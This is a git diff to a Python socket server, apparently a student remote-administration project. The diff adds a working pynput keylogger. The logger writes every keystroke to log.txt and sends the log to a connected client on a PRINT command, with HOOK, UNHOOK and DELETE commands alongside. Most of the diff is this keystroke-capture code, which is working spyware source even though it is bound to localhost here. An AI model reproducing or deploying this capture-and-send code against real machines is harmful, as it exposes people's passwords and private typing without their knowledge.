@@ -6,6 +6,7 @@ import os
 import tkinter as tk
 import threading
 from pynput import keyboard
+import atexit
 
 HOST = "127.0.0.1"
 PORT = 65431
@@ -13,27 +14,78 @@ PORT = 65431
 #####################################################################
 # send keystroke
 def on_key_press(key, client_socket):
-    try:
-        client_text = str(key.char)
-    except AttributeError:
-        client_text = str(key)
+    key = str(key)
+    key = key.replace("'", "")
+    if (key == "Key.ctrl_l"):
+        key = ""
+    if (key == "Key.enter"):
+        key = "\n"
+    if (key == "Key.space"):
+        key = " "
+    if (len(key) > 2):
+        key = " " + key
+    with open("log.txt", "a") as file:
+        file.write(key)
 
-    client_socket.send(client_text.encode())
+def Listening(client_socket, stop_event):
+    listener = keyboard.Listener(on_press=lambda key: on_key_press(key, client_socket))
+    listener.start()
+    stop_event.wait()
+    listener.stop()
 
 def handle_client(client_socket):
-    isHook = False;
-    while (not isHook):
-        data = client_socket.recv(1024)
+    print("Handle client")
+    stop_event = threading.Event()
+    listener_thread = None
+    while (True):
+        data = client_socket.recv(1024).decode()
         data = str(data)
+        print(f"Hanle event of key stroke : {data}")
         if (data == "HOOK"):
-            isHook = True;
-    if (isHook):
-        with keyboard.Listener(on_press=lambda key: on_key_press(key, client_socket)) as listener:
-            listener.join()
+            if listener_thread:
+                stop_event.set()
+                listener_thread.join()
+                print("Listener thread stopped.")
+            stop_event.clear()
+            listener_thread = threading.Thread(target=Listening, args=(client_socket, stop_event))
+            listener_thread.start()
+        if (data == "UNHOOK"):
+            stop_event.set()
+            if listener_thread:
+                listener_thread.join()
+                print("Listener thread stopped.")
+        if (data == "PRINT"):
+            # Stop the thread
+            if listener_thread:
+                stop_event.set()
+                listener_thread.join()
+                print("Listener thread stopped.")
+
+            if os.path.exists("log.txt"):
+                with open('log.txt', 'rb') as file:
+                    file_data = file.read()
+            else: 
+                file_data = b"?"
+            client_socket.sendall(file_data)
+
+            # Recreate the thread
+            stop_event.clear()
+            listener_thread = threading.Thread(target=Listening, args=(client_socket, stop_event))
+            listener_thread.start()
+        if (data == "DELETE"):
+            if os.path.exists('log.txt'):
+                os.remove('log.txt')
+        if (data == "CLOSE"):
+            if listener_thread:
+                stop_event.set()
+                listener_thread.join()
+                print("Listener thread stopped.")
+            print("Break loops")
+            break
 
 def send_keystroke(client_socket):
-    client_thread = threading.Thread(target=handle_client, args=(client_socket,))
-    client_thread.start()
+    handle_client(client_socket)
+
 #####################################################################
 # Screenshot
 def take_screenshot(client_socket):
@@ -104,7 +156,6 @@ def ShutDown(countdown_seconds=10):
 # Fix_Regsistry
 def fix_registry():
     print("Fixing the registry...")
-    
 
 def handle_command(client_socket, command):
     parts = command.split()
@@ -145,20 +196,3 @@ def start_server():
 
 if __name__ == "__main__":
     start_server()
-
-# if command == "ProcessRunning":
-#     # process_output = subprocess.check_output(["tasklist"])
-#     # connection.sendall(process_output)
-#     print("ProcessRunning!")
-# elif command == "AppRunning":
-#     # app_output = subprocess.check_output(["your_command_to_check_app_running"])
-#     # connection.sendall(app_output)
-#     print("AppRunning!")
-# elif command == "SendKeyStroke":
-#     print("KeyStroke!")
-# elif command == "ShutDown":
-#     print("ShutDown!")
-# elif command == "TakeScreenShot":
-#     print("TakeScreenShot!")
-# elif command == "FixRegistry":
-#     print("FixRegistry!")
